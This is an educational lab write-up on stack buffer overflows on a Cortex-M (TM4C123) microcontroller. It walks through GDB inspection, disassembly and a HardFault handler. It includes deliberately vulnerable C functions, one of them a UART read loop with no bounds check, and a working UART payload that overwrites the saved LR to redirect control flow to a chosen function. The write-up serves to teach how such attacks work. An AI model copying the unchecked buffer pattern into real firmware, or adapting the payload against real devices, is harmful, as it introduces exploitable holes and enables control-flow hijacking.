# Stack Smashing on TM4C123: GDB, Registers, and Corrupting Saved LR

## 1. Goal of this experiment

The goal of this lab is to understand how a stack-based buffer overflow can move from simple data corruption to **control-flow corruption**.

In the first experiments, the overflow only changed nearby data:

```c
buffer[10] = 293;
```

That was useful because it showed that writing past the end of a stack array can overwrite memory that belongs to something else.

In this experiment, the goal is stronger:

```text
stack buffer overflow
        ↓
overwrite saved LR on the stack
        ↓
function returns
        ↓
PC receives corrupted return address
        ↓
program branches to the wrong address
```

This is the core idea behind stack smashing.

---

## 2. Important registers

On Cortex-M / ARM Thumb code, these registers are very important when debugging stack overflows.

| Register | Meaning | Why we care |
|---|---|---|
| `sp` | Stack pointer | Points to the current top/start of the active stack frame |
| `r7` | General-purpose register, often used as frame pointer by GCC | Gives a stable base address for local variables |
| `lr` | Link register | Holds the function return address |
| `pc` | Program counter | Holds the address of the instruction currently executing |

### `sp`

`sp` points to the current stack location. The stack grows downward on Cortex-M, meaning new stack data is placed at lower addresses.

Example:

```text
Higher addresses
0x20008000  top of SRAM / initial stack area
...
0x20007fc0  current stack frame
Lower addresses
```

### `r7`

`r7` is not a special stack register by itself. It is a normal CPU register.

However, GCC often uses `r7` as a **frame pointer** in Cortex-M Thumb code.

That means `r7` becomes a stable reference point for the current function's local variables.

Example:

```asm
push {r7, lr}
sub  sp, #40
add  r7, sp, #0
```

After this:

```text
r7 = start of the current function's local stack frame
```

Then the compiler can access local variables using offsets from `r7`:

```asm
str r3, [r7, #0]     ; write to buffer[0]
str r3, [r7, #44]    ; write to buffer[11]
```

### `lr`

`lr` contains the return address after a function call.

When a function calls another function, it usually needs to save its own `lr` on the stack:

```asm
push {r7, lr}
```

That saved `lr` becomes very important. If a buffer overflow overwrites it, the function may return to an attacker-controlled or invalid address.

### `pc`

`pc` is the program counter. It decides where the CPU executes next.

If saved `lr` is corrupted and then restored into `pc`, control flow changes.

---

## 3. Current vulnerable code

The useful experiment code is:

```c
volatile uint32_t observation;

__attribute__((noinline))
static void helper(void)
{
    observation++;
}

__attribute__((noinline))
static void vulnerable(void)
{
    volatile uint32_t buffer[10];
    buffer[0] = 0;

    helper();  /* Forces vulnerable() to preserve its own return address. */

    buffer[11] = 0xDEADBEEF;  /* Overwrites the saved return address. */

    __asm volatile ("nop");
}

int main(void)
{
    vulnerable();

    while (1) {
    }
}
```

### Why `__attribute__((noinline))` is used

`noinline` tells GCC not to inline the function.

Without it, the compiler may replace:

```c
helper();
```

with the body of `helper()` directly inside `vulnerable()`.

We want `helper()` to remain a real function call because that encourages the compiler to save `lr` in `vulnerable()`.

### Why `helper()` is called

If `vulnerable()` calls another function, it becomes a **non-leaf function**.

Because it calls `helper()`, it needs to preserve its own return address. This leads to a prologue like:

```asm
push {r7, lr}
```

This places the saved `lr` on the stack, where we can study and corrupt it.

### Why `__asm volatile ("nop")` is used

`nop` means "no operation".

It creates a simple instruction that is useful as a debugging marker.

```c
__asm volatile ("nop");
```

means:

```text
emit one NOP instruction here
do not optimize it away
```

It does not stop the CPU forever. It executes once and continues.

---

## 4. Useful GDB commands

### Connect to the target

Usually OpenOCD runs in one terminal.

Then in another terminal:

```gdb
arm-none-eabi-gdb stack_overflow.elf
target extended-remote :3333
monitor reset halt
load
```

### Break at the vulnerable function

```gdb
break vulnerable
continue
```

### Inspect important registers

```gdb
info registers sp lr r7 pc
```

Use this when you want to know:

```text
Where is the current stack?
What is the current frame pointer?
What is the return address?
Where is the CPU executing?
```

### Print the buffer address

```gdb
p/x &buffer[0]
```

This tells you where the stack buffer begins.

Observed result:

```gdb
p/x &buffer[0]
$2 = 0x20007fc0
```

So:

```text
buffer[0] = 0x20007fc0
```

### Examine raw stack memory

```gdb
x/24wx $sp
```

Meaning:

```text
x      = examine memory
24     = show 24 units
w      = word size, 4 bytes
x      = hexadecimal
$sp    = start at the current stack pointer
```

Use this after entering `vulnerable()` and after the overflow write.

### Disassemble the function

```gdb
disassemble vulnerable
```

This shows the assembly generated by GCC.

---

## 5. Observed stack layout before return

At the breakpoint inside `vulnerable()`, the observed registers were:

```gdb
sp = 0x20007fc0
lr = 0x00000079
r7 = 0x20007fc0
pc = 0x0000005e <vulnerable+6>
```

And:

```gdb
p/x &buffer[0]
$2 = 0x20007fc0
```

So:

```text
r7 = 0x20007fc0
sp = 0x20007fc0
buffer[0] = 0x20007fc0
```

Because `buffer` is:

```c
volatile uint32_t buffer[10];
```

and each `uint32_t` is 4 bytes:

```text
buffer[0]  = r7 + 0   = 0x20007fc0
buffer[1]  = r7 + 4   = 0x20007fc4
buffer[2]  = r7 + 8   = 0x20007fc8
buffer[3]  = r7 + 12  = 0x20007fcc
buffer[4]  = r7 + 16  = 0x20007fd0
buffer[5]  = r7 + 20  = 0x20007fd4
buffer[6]  = r7 + 24  = 0x20007fd8
buffer[7]  = r7 + 28  = 0x20007fdc
buffer[8]  = r7 + 32  = 0x20007fe0
buffer[9]  = r7 + 36  = 0x20007fe4
buffer[10] = r7 + 40  = 0x20007fe8  out of bounds
buffer[11] = r7 + 44  = 0x20007fec  out of bounds
```

The saved registers are located after the buffer:

```text
Higher addresses

0x20007fec   saved LR
0x20007fe8   saved old r7

0x20007fe4   buffer[9]
0x20007fe0   buffer[8]
...
0x20007fc4   buffer[1]
0x20007fc0   buffer[0]

Lower addresses
```

So:

```text
buffer[10] overwrites saved old r7
buffer[11] overwrites saved LR
```

---

## 6. Difference between current `r7` and saved old `r7`

This was an important confusion point.

GDB showed:

```gdb
info registers r7
r7 = 0x20007fc0
```

But the stack contained:

```text
0x20007fe8: 0x20007ff0
```

These are different things:

```text
current r7 register      = 0x20007fc0
saved old r7 in memory   = 0x20007ff0
```

The current `r7` belongs to `vulnerable()`.

The saved old `r7` belongs to the caller and will be restored when `vulnerable()` returns.

Function entry does this:

```asm
push {r7, lr}     ; save caller's r7 and return address
sub  sp, #40      ; reserve space for buffer[10]
add  r7, sp, #0   ; make r7 point to vulnerable's local frame
```

Function exit later restores the old value:

```asm
pop {r7, pc}
```

---

## 7. Disassembly of `vulnerable()`

Observed disassembly:

```asm
0x00000058 <+0>:     push    {r7, lr}
0x0000005a <+2>:     sub     sp, #40
0x0000005c <+4>:     add     r7, sp, #0
0x0000005e <+6>:     movs    r3, #0
0x00000060 <+8>:     str     r3, [r7, #0]
0x00000062 <+10>:    bl      0x3c <helper>
0x00000066 <+14>:    ldr     r3, [pc, #12]   @ (0x74 <vulnerable+28>)
0x00000068 <+16>:    str     r3, [r7, #44]
0x0000006a <+18>:    nop
0x0000006c <+20>:    nop
0x0000006e <+22>:    adds    r7, #40
0x00000070 <+24>:    mov     sp, r7
0x00000072 <+26>:    pop     {r7, pc}
0x00000074 <+28>:    bkpt    0x00ef
0x00000076 <+30>:    udf     #173
```

### Prologue

```asm
push {r7, lr}
sub  sp, #40
add  r7, sp, #0
```

This creates the stack frame.

```text
push {r7, lr}   saves old r7 and saved return address
sub sp, #40     reserves 40 bytes for buffer[10]
add r7, sp, #0  makes r7 point to buffer[0]
```

### `buffer[0] = 0`

```asm
movs r3, #0
str  r3, [r7, #0]
```

This writes `0` to:

```text
r7 + 0 = buffer[0]
```

### `helper()`

```asm
bl 0x3c <helper>
```

This is the real function call that made `vulnerable()` preserve its return address.

### Loading `0xDEADBEEF`

```asm
ldr r3, [pc, #12]   @ (0x74 <vulnerable+28>)
```

The compiler placed the constant `0xDEADBEEF` nearby in memory as a literal.

The disassembler shows it as:

```asm
bkpt 0x00ef
udf  #173
```

This looks strange, but it is just the bytes of `0xDEADBEEF` being interpreted as instructions. It is data, not code intended to run.

### The important overwrite

```asm
str r3, [r7, #44]
```

Since:

```text
r7 = 0x20007fc0
```

then:

```text
r7 + 44 = 0x20007fec
```

And:

```text
0x20007fec = saved LR
```

So this instruction overwrites saved `LR` with `0xDEADBEEF`.

This corresponds directly to:

```c
buffer[11] = 0xDEADBEEF;
```

---

## 8. The function return

The epilogue is:

```asm
adds r7, #40
mov  sp, r7
pop  {r7, pc}
```

Step by step:

### Step 1

```asm
adds r7, #40
```

Before:

```text
r7 = 0x20007fc0
```

After:

```text
r7 = 0x20007fe8
```

This points to the saved-register area.

### Step 2

```asm
mov sp, r7
```

Now:

```text
sp = 0x20007fe8
```

### Step 3

```asm
pop {r7, pc}
```

This does:

```text
r7 = *(uint32_t *)0x20007fe8
pc = *(uint32_t *)0x20007fec
```

Normally:

```text
r7 = saved old r7
pc = saved LR
```

But because the overflow changed saved LR:

```text
pc = 0xDEADBEEF
```

On Cortex-M, bit 0 of an address indicates Thumb state. Therefore GDB displays:

```text
pc = 0xDEADBEEE
```

instead of:

```text
pc = 0xDEADBEEF
```

---

## 9. Observed result after corruption

After stepping through the return, GDB showed:

```gdb
halted: PC: 0xdeadbeee
0xdeadbeee in ?? ()
```

Then:

```gdb
next
Cannot find bounds of current function
```

This happened because `0xDEADBEEE` is not a real function in the firmware.

GDB cannot find function boundaries because the CPU is no longer executing inside valid program code.

This proves:

```text
buffer[11] changed saved LR
saved LR was restored into PC
PC became attacker-controlled
control flow was corrupted
```

### `HardFault_Handler` implementation

The project also includes a custom `HardFault_Handler` so that invalid control flow is easier to inspect in GDB.

The startup code places `HardFault_Handler` in the vector table:

```c
(uint32_t)HardFault_Handler,    /* HardFault */
```

So when the CPU takes a HardFault, execution enters this handler instead of the default infinite loop.

The handler itself is marked `naked`:

```c
__attribute__((naked, no_stack_protector))
void HardFault_Handler(void)
{
    __asm volatile(
        "tst lr, #4        \n"
        "ite eq            \n"
        "mrseq r0, msp     \n"
        "mrsne r0, psp     \n"
        "b hardfault_c     \n"
    );
}
```

`naked` is important because it tells the compiler not to generate a normal C function prologue or epilogue. A fault handler needs to inspect the exception stack frame exactly as the CPU created it, so the handler starts with a small hand-written assembly sequence.

When a Cortex-M exception happens, the CPU automatically pushes this frame onto the active stack:

```text
stack_frame[0] = r0
stack_frame[1] = r1
stack_frame[2] = r2
stack_frame[3] = r3
stack_frame[4] = r12
stack_frame[5] = lr
stack_frame[6] = pc
stack_frame[7] = xpsr
```

The assembly decides which stack pointer holds that frame:

```asm
tst lr, #4
ite eq
mrseq r0, msp
mrsne r0, psp
```

Inside an exception handler, `lr` does not contain a normal return address. It contains an exception-return value. Bit 2 of that value tells whether the interrupted code was using `MSP` or `PSP`.

So:

```text
if bit 2 is 0, use MSP
if bit 2 is 1, use PSP
```

The selected stack pointer is placed in `r0`, which is the first C function argument on ARM. Then:

```asm
b hardfault_c
```

branches into the C helper:

```c
void hardfault_c(uint32_t *stack_frame)
{
    hardfault_stack_pointer = (uint32_t)stack_frame;
    hardfault_r0 = stack_frame[0];
    hardfault_r1 = stack_frame[1];
    hardfault_r2 = stack_frame[2];
    hardfault_r3 = stack_frame[3];
    hardfault_r12 = stack_frame[4];
    hardfault_lr = stack_frame[5];
    hardfault_pc = stack_frame[6];
    hardfault_xpsr = stack_frame[7];

    while (1) {
    }
}
```

Those `volatile` globals preserve the fault context so GDB can inspect it after the CPU stops in the infinite loop.

The most useful values are:

```text
hardfault_pc  = instruction address where the fault happened
hardfault_lr  = LR value from the code that faulted
hardfault_xpsr = processor status at the time of the fault
```

In this experiment, if the corrupted return address causes a real HardFault, `hardfault_pc` is the value to inspect first. It shows where the CPU tried to execute after the corrupted saved `LR` was loaded into `pc`.

---

## 10. Why this is stack smashing

A normal buffer overflow only changes data.

Example:

```text
buffer[10] overwrites another local variable
```

But here:

```text
buffer[11] overwrites saved LR
```

The saved `LR` is control data. It decides where the function returns.

So this experiment demonstrates:

```text
stack-based buffer overflow
        ↓
control-data corruption
        ↓
corrupted return address
        ↓
PC control
```

That is the core mechanism of stack smashing.

---

## 11. Clean GDB workflow for repeating the experiment

Use this sequence:

```gdb
target extended-remote :3333
monitor reset halt
load

break vulnerable
continue

disassemble vulnerable
info registers sp lr r7 pc
p/x &buffer[0]
x/24wx $sp
```

Step through the important instructions:

```gdb
stepi
stepi
stepi
```

Or use source-level stepping:

```gdb
next
```

After the overflow write:

```gdb
x/24wx $sp
```

Confirm that:

```text
0x20007fec = 0xdeadbeef
```

Then continue or step to the return:

```gdb
next
next
next
```

You should see:

```text
PC = 0xdeadbeee
```

---

## 12. UART-controlled overflow with `vulnerable2()`

After proving the overwrite with a fixed C statement:

```c
buffer[11] = 0xDEADBEEF;
```

we moved to a more realistic version: the overwrite comes from UART input.

The idea is no longer:

```text
program itself writes directly out of bounds
```

but instead:

```text
user sends too many 32-bit hex words over UART
        ↓
firmware stores each word into a stack buffer
        ↓
there is no bounds check
        ↓
input words continue past the buffer
        ↓
saved r7 and saved LR can be overwritten
```

This is closer to a real firmware bug, because the vulnerable behavior comes from trusting external input length.

### Simplified vulnerable idea

The relevant idea is:

```c
__attribute__((noinline))
static void vulnerable2(void)
{
    volatile uint32_t buffer[8];
    uint32_t i = 0;

    uart_send_string("Enter 32-bit words in hex, end with newline:\r\n");

    while (1) {
        uint32_t word = uart_read_hex_word();

        buffer[i] = word;
        i++;

        if (uart_last_char_was_newline()) {
            uart_send_string("NEWLINE DETECTED\r\n");
            break;
        }
    }
}
```

The bug is here:

```c
buffer[i] = word;
```

There is no check like:

```c
if (i < 8) {
    buffer[i] = word;
}
```

So once `i` becomes larger than 7, the writes leave the valid array.

---

## 13. UART payload that successfully redirects control flow

The working payload was:

```text
11111111 22222222 33333333 44444444 55555555 66666666 77777777 88888888 88888888 00000009 20007ff0 000002e1\r
```

This payload is a sequence of 32-bit words written by UART into the stack.

A useful way to think about it is:

```text
11111111  -> buffer[0]
22222222  -> buffer[1]
33333333  -> buffer[2]
44444444  -> buffer[3]
55555555  -> buffer[4]
66666666  -> buffer[5]
77777777  -> buffer[6]
88888888  -> buffer[7]
88888888  -> first word after buffer
00000009  -> overwrite i with a safe expected value
20007ff0  -> overwrite saved old r7 with a valid-looking old frame pointer
000002e1  -> overwrite saved LR with blink address | 1
```

The final word is the most important one:

```text
000002e1
```

This is the target function address with the Thumb bit set.

If `blink` is at:

```text
0x000002e0
```

then the return address must be:

```text
0x000002e1
```

because Cortex-M executes Thumb code and bit 0 must be set in a branch target address.

---

## 14. Why `00000009` is needed in the payload

One important detail is that the overflow does not only overwrite saved `r7` and saved `lr`.

It also overwrites local variables that are still used by the function before it returns.

In `vulnerable2()`, the variable `i` controls the next write:

```c
buffer[i] = word;
i++;
```

If the overflow corrupts `i` with a random value, the next write may jump to a completely different address.

For example, if `i` becomes:

```text
0xAAAAAAAA
```

then this line:

```c
buffer[i] = word;
```

will try to write very far away from the stack buffer. That can corrupt unrelated memory or trigger a fault before the function reaches its return instruction.

That is why the payload intentionally overwrites `i` with:

```text
00000009
```

This keeps `i` close to the expected loop value and avoids destroying the flow too early.

So when building the payload, keep in mind:

```text
if the payload reaches the local variable i,
write a value that keeps the next buffer[i] access predictable.
```

In this experiment, `00000009` worked because it matched the expected progress of the loop at that point.

---

## 15. Stack layout observed with `vulnerable2()`

The useful stack area looked like this:

```text
0x20007fc0:  11111111  22222222  33333333  44444444
0x20007fd0:  55555555  66666666  77777777  88888888
0x20007fe0:  88888888  00000009  20007ff0  000002e1
```

This can be interpreted as:

```text
0x20007fc0  buffer[0]
0x20007fc4  buffer[1]
0x20007fc8  buffer[2]
0x20007fcc  buffer[3]
0x20007fd0  buffer[4]
0x20007fd4  buffer[5]
0x20007fd8  buffer[6]
0x20007fdc  buffer[7]
0x20007fe0  overflow beyond buffer
0x20007fe4  overwritten i
0x20007fe8  saved old r7
0x20007fec  saved LR
```

The saved LR slot becomes:

```text
0x20007fec: 0x000002e1
```

Then when the function returns, the epilogue restores the saved LR into `pc`.

So instead of returning normally, execution branches to `blink`.

---

## 16. Important lesson from `vulnerable2()`

Compared with the hardcoded overwrite:

```c
buffer[11] = 0xDEADBEEF;
```

this UART version is more realistic, but also more sensitive.

The payload must account for every stack word it overwrites:

```text
buffer data
extra stack words
local variables still used by the function
saved r7
saved LR
```

If one of the middle values is wrong, the function may crash before the final return.

That is why stack smashing is not only about reaching saved LR. It is also about keeping the program alive long enough to return through the corrupted saved LR.

---

## 17. Summary

The most important result is:

```text
buffer[0]  = r7 + 0
buffer[10] = r7 + 40 = saved old r7
buffer[11] = r7 + 44 = saved LR
```

The instruction:

```asm
str r3, [r7, #44]
```

writes `0xDEADBEEF` into the saved `LR` slot.

The return instruction:

```asm
pop {r7, pc}
```

loads that corrupted value into `pc`.

So the function does not return normally. It jumps to:

```text
0xDEADBEEE
```

This is a successful demonstration of stack smashing on a Cortex-M microcontroller.
